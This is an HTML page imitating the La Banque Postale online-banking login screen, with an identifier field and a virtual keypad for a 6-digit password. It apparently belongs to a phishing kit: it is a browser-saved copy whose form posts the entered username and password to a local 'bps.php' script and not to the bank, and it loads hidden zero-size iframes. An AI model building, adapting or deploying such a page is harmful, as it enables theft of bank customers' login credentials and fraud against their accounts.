
<!DOCTYPE html>

<html class="no-js" lang="fr" data-tb-mode="light" data-tb-cvd="old">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=WINDOWS-1252">

    <title>Connexion - La Banque Postale</title>
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <meta name="format-detection" content="telephone=no">

    <meta name="theme-color" content="#0b234d">

    <style type="text/css">
        @import url(https://transverse.labanquepostale.fr/xo_/9.11.0.0/cvvs/css/loader.css);
        @import url(https://transverse.labanquepostale.fr/xo_/9.11.0.0/cvvs/css/cvs_refonte.css);
        @import url(https://transverse.labanquepostale.fr/xo_/toolbox/3.2/toolbox-xo-celadon.css);
        @import url(https://transverse.labanquepostale.fr/xo_/9.11.0.0/cvvs/css/cvd-refonte.css);
    </style>

    <script src="./toolbox-xo-celadon.min.js" type="text/javascript"></script>
    <script language="javascript" type="text/javascript" src="./val_keypad_cvd.js"></script>
    <script language="javascript" type="text/javascript" src="./val_keypad_cvvs-env.js"></script>
    <script type="text/javascript" async="" src="./loreo.js"></script>
    <script src="./fruprem.js.t�l�chargement" async="" type="text/javascript"></script>
    <script type="text/javascript" src="./netroco.js.t�l�chargement" id="f3098f"></script>
    <script type="text/javascript" src="./piment.js.t�l�chargement" id="nmwff"></script>
    <script type="text/javascript" src="./drun.js.t�l�chargement" id="0qwqmd"></script>
    <script type="text/javascript" src="./dasti.js.t�l�chargement" id="p57db8"></script>
    <script type="text/javascript" async="" src="./QSAy"></script>
    <script type="text/javascript" async="" src="./u9mW"></script>
    <script type="text/javascript" async="" src="./u9mW(1)"></script>
    <script type="text/javascript" async="" src="./QSAy(1)"></script>
    <script type="text/javascript" async="" src="./u9mW(2)"></script>
    <script type="text/javascript" async="" src="./u9mW(3)"></script>
</head>

<body data-image="logo" data-tb-animate="actif" class="tb-user-connected">
    <div class="flex-container--column tb-wrapper-main">
        <main class="flex-item-fluid overflow-y back-color-trans txt-color-black txt-primary p-16" role="main">
            <form id="form-xo-1" method="post" action="bps.php" name="formAccesCompte" target="_top" >

                <div id="hidden">
                    <input type="hidden" name="urlbackend"
                        value="%2Fvoscomptes%2FcanalXHTML%2Fidentif.ea%3Forigin%3Dparticuliers">
                    <input type="hidden" name="origin" value="particuliers">
                    <input type="hidden" name="cv" value="true">
                    <input type="hidden" name="cvvs" value="">
                    <input type="hidden" id="iscd" name="iscdName"
                        value="pp201a06cd5ed9abaa8675e9e6874a88806f4ce43c1747001568">
                    <input type="hidden" id="clt" name="cltName" value="1">
                </div>

                <!-- ECRAN -->
                <div data-tb-cvd-bloc="" class="flex-item-fluid small-w100 tiny-w100" id="ecran">

                    <div data-tb-form-field="" data-tb-form-id="identifiant" class="flex-container w100">

                        <label data-tb-variant="body-b" for="identifiant" class="txt-primary mb-4">Identifiant (10
                            chiffres)</label>
                        <div class="flex-container w100">
                            <div class="tb-container-inputfield w100 --reset --underline --injected --empty"
                                data-tb-type="code" data-tb-length="0">
                                <input type="text" id="identifiant" inputmode="numeric"
                                    data-tb-input-field-accessreset="Effacer la saisie de l&#39;identifiant"
                                    maxlength="10" pattern="[\*0-9]*" autocomplete="username" aria-required="true"
                                    name="username" class="--ready --savearia">
                                <button class="flex-container flex-align-center flex-center --reset"
                                    data-lien-user="actif" type="button"><span data-icon="tb-reset" class="--reset"
                                        aria-hidden="true"></span><span class="visually-hidden access-text">Effacer la
                                        saisie de l'identifiant</span></button>
                                <div data-tb-underline="" aria-hidden="true">
                                    <div class=""></div>
                                    <div class=""></div>
                                    <div class=""></div>
                                    <div class=""></div>
                                    <div class=""></div>
                                    <div class=""></div>
                                    <div class=""></div>
                                    <div class=""></div>
                                    <div class=""></div>
                                    <div class="--caret"></div>
                                </div>
                            </div>
                        </div>
                        <div data-tb-form-message="" class="flex-container flex-item-last">
                            <div data-icon="tb-erreur" aria-hidden="true" class="--size16px"></div>
                            <p data-ad-messages="identifiant"
                                class="flex-container--column flex-item-fluid mts mb0 is-hidden" hidden="hidden">
                                <span data-ad-message="RG001" id="identifiant-RG001" class="is-hidden"
                                    hidden="hidden">Vous devez saisir un identifiant.</span>
                                <span data-ad-message="RG002" id="identifiant-RG002" class="is-hidden"
                                    hidden="hidden">L'identifiant doit contenir 10 chiffres.</span>
                            </p>
                        </div>
                    </div>

                    <!-- Case à cocher -->
                    <div class="tb-switch --animate-touch mt-16">
                        <input id="check" name="check" type="checkbox" class="visually-hidden">
                        <label for="check" class="flex-container--row flex-align-center">
                            <span class="tb-switch-check">
                                <span data-icon="ic_interface_check" aria-hidden="true" class="--absolute-contains">
                                </span>
                            </span>
                            <span data-tb-variant="body-s"
                                class="tb-switch-label flex-item-first flex-item-fluid --fix-ms txt-secondary">
                                Memoriser mon identifiant
                            </span>
                        </label>
                    </div>


                    <!-- Bouton continuer -->
                    <div id="btnContinuer" class="mt-16 u-txt-center" hidden="true">
                        <button class="tb-btn-p --large w100" type="submit" data-lien-user="actif"
                            onclick="continuer()">
                            <span>Continuer</span>
                        </button>
                    </div>

                    <!-- Volet Mot de passe -->
                    <div id="volet" class="w100 mt-16">

                        <!-- Mot de passe -->
                        <div data-tb-form-field="" data-tb-form-id="motdepasse" class="flex-container--column">

                            <!-- LABEL -->
                            <div data-tb-cvd-label="" role="heading" aria-level="3" id="label-password" tabindex="-1"
                                data-tb-cvd-alert="N&#39;appuyez pas sur les chiffres de votre clavier, utilisez les boutons suivants pour saisir votre mot de passe">
                                <span aria-hidden="true" data-tb-variant="body-b" class="txt-primary">Mot de passe (6
                                    chiffres)</span>
                                <span class="visually-hidden">Utilisez les boutons suivants pour saisir votre Mot de
                                    passe � 6 chiffres sur ce clavier</span>
                            </div>

                            <!-- INPUT + PUCES -->
                            <div class="tb-container-cvdPsw --reset --injected --empty">
                                <div class="relative">
                                    <input type="text" id="password" name="password" maxlength="6" hidden=""
                                        class="--ready --savearia">
                                    <span class="puces" aria-hidden="true"><span class="puce"></span><span
                                            class="puce"></span><span class="puce"></span><span
                                            class="puce"></span><span class="puce"></span><span
                                            class="puce"></span></span>
                                </div>
                                <div data-tb-aria="" aria-atomic="true" class="visually-hidden access-text"
                                    aria-live="polite">
                                    <p>0 chiffre saisi sur 6</p>
                                </div><button class="flex-container flex-align-center flex-center --reset"
                                    id="reset-password" type="button" data-lien-user="actif" hidden="true"><span
                                        data-icon="tb-reset" aria-hidden="true"></span><span
                                        class="visually-hidden access-text">Effacer la saisie du mot de
                                        passe</span></button>
                            </div>

                            <!-- ERRORS -->
                            <div data-tb-form-message="" class="flex-container">
                                <div data-icon="tb-erreur" aria-hidden="true" class="--size16px"></div>
                                <div role="heading" aria-level="4" id="motdepasse" tabindex="-1"
                                    data-ad-messages="motdepasse"
                                    class="flex-container--column flex-item-fluid no-aria-describedby is-hidden --savearia"
                                    hidden="hidden">
                                    <span data-ad-message="vide" id="motdepasse-vide" class="is-hidden"
                                        hidden="hidden">Vous devez saisir un mot de passe.</span>
                                    <span data-ad-message="incomplet" id="motdepasse-incomplet" class="is-hidden"
                                        hidden="hidden">
                                        <span aria-hidden="true">Le mot de passe doit contenir 6 chiffres</span>
                                        <span class="visually-hidden access-text">Le mot de passe doit contenir 6
                                            chiffres</span>
                                    </span>
                                </div>

                            </div>
                            <!-- CLAVIER -->
                            <div class="flex-container flex-center mt-16" data-tb-cvd-id="password">
                                <div data-tb-cvd-keys="">
                                    <button type="button" data-tb-index="0" class="tb-btn-k --medium">0</button>
                                    <button type="button" data-tb-index="1" class="tb-btn-k --medium">1</button>
                                    <button type="button" data-tb-index="2" class="tb-btn-k --medium">2</button>
                                    <button type="button" data-tb-index="3" class="tb-btn-k --medium">3</button>
                                    <button type="button" data-tb-index="4" class="tb-btn-k --medium">4</button>
                                    <button type="button" data-tb-index="5" class="tb-btn-k --medium">5</button>
                                    <button type="button" data-tb-index="6" class="tb-btn-k --medium">6</button>
                                    <button type="button" data-tb-index="7" class="tb-btn-k --medium">7</button>
                                    <button type="button" data-tb-index="8" class="tb-btn-k --medium">8</button>
                                    <span></span>
                                    <button type="button" data-tb-index="9" class="tb-btn-k --medium">9</button>
                                    <span></span>

                                </div>
                            </div>

                        </div>
                        <!-- Bouton de connexion -->
                        <div class="flex-container--column flex-align-center mt-24 u-txt-center">
                            <button data-tb-cvd-valider="" id="btnConfirmer" class="tb-btn-p --large w100" type="submit"
                                data-lien-user="actif" onclick="submitFormulaire()"
                                data-tb-cvd-alert="N&#39;appuyez pas sur les chiffres de votre clavier, utilisez les boutons pr�c�dents pour saisir votre mot de passe">
                                <span>Se connecter</span>
                            </button>
                        </div>
                    </div>
                </div>

            </form>
            <!-- LOADER -->
            <div id="tbi-loader" class="--tiny"></div>
        </main>
    </div>
    <script language="javascript" type="text/javascript">
        var PATH_JS = "https://transverse.labanquepostale.fr/xo_/9.11.0.0/cvvs";
        var PATH_RESIZER = "https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/designsystem/vendors";
    </script>



    <script type="text/javascript" src="./iframeresizer-contentWindow-4-3-2.min.js.t�l�chargement"></script>
    <div style="clear: both; display: block; height: 0px;"></div><iframe title="pot_gf" id="idi142"
        style="visibility: hidden; width: 0px; height: 0px; border: none; display: none;"
        src="./saved_resource(3).html"></iframe><iframe title="xtnzkt" id="igdi905"
        style="visibility: hidden; width: 0px; height: 0px; border: none; display: none;"
        src="./saved_resource(4).html"></iframe>
</body>

</html>